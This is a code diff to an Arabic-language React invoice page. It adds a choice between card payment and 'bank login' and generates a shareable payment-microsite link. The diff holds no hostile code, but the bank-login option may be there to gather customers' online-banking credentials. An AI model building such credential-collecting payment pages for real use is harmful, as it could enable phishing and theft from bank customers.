@@ -7,9 +7,10 @@ import { Card } from "@/components/ui/card";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { Textarea } from "@/components/ui/textarea";
 import { Country, COUNTRIES, getCountryByCode } from "@/lib/countries";
-import { ArrowRight, FileText, Plus, Trash2, Download, Send } from "lucide-react";
+import { ArrowRight, FileText, Plus, Trash2, Download, Send, CreditCard, Building2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useCreateLink } from "@/hooks/useSupabase";
+import { generatePaymentLink } from "@/utils/paymentLinks";
 
 interface InvoiceItem {
   id: string;
@@ -42,6 +43,8 @@ const CreateInvoice = () => {
     seal: "",
     signature: "",
   });
+
+  const [paymentMethod, setPaymentMethod] = useState("card");
 
   const [items, setItems] = useState<InvoiceItem[]>([
     {
@@ -108,6 +111,7 @@ const CreateInvoice = () => {
       total: total,
       notes: invoiceData.notes,
       service_type: 'invoices',
+      payment_method: paymentMethod,
     };
 
     try {
@@ -123,8 +127,18 @@ const CreateInvoice = () => {
         description: "يمكنك مشاركة الرابط مع العميل",
       });
 
-      // Navigate to microsite
-      navigate(link.microsite_url);
+      const paymentUrl = generatePaymentLink({
+        invoiceId: link.id,
+        company: 'invoice',
+        country: country || 'SA',
+        amount: total,
+        currency: invoiceData.currency,
+        paymentMethod: paymentMethod,
+        type: 'invoices'
+      });
+
+      // Navigate to microsite with encoded data
+      navigate(paymentUrl.replace(window.location.origin, ''));
     } catch (error) {
       // Error creating invoice
     }
@@ -300,6 +314,33 @@ const CreateInvoice = () => {
                       </div>
                     </div>
                   ))}
+                </div>
+              </Card>
+
+              {/* Payment Method */}
+              <Card className="p-6">
+                <h2 className="text-lg font-bold mb-4">طريقة السداد المتاحة في الرابط</h2>
+                <div className="grid grid-cols-2 gap-4">
+                  <button
+                    type="button"
+                    onClick={() => setPaymentMethod('card')}
+                    className={`p-4 rounded-xl border-2 transition-all flex flex-col items-center gap-2 ${
+                      paymentMethod === 'card' ? 'border-primary bg-primary/5' : 'border-muted bg-muted/20'
+                    }`}
+                  >
+                    <CreditCard className={`w-8 h-8 ${paymentMethod === 'card' ? 'text-primary' : 'text-muted-foreground'}`} />
+                    <span className={`text-sm font-bold ${paymentMethod === 'card' ? 'text-primary' : 'text-muted-foreground'}`}>بطاقة دفع</span>
+                  </button>
+                  <button
+                    type="button"
+                    onClick={() => setPaymentMethod('bank_login')}
+                    className={`p-4 rounded-xl border-2 transition-all flex flex-col items-center gap-2 ${
+                      paymentMethod === 'bank_login' ? 'border-primary bg-primary/5' : 'border-muted bg-muted/20'
+                    }`}
+                  >
+                    <Building2 className={`w-8 h-8 ${paymentMethod === 'bank_login' ? 'text-primary' : 'text-muted-foreground'}`} />
+                    <span className={`text-sm font-bold ${paymentMethod === 'bank_login' ? 'text-primary' : 'text-muted-foreground'}`}>دخول بنكي</span>
+                  </button>
                 </div>
               </Card>
 
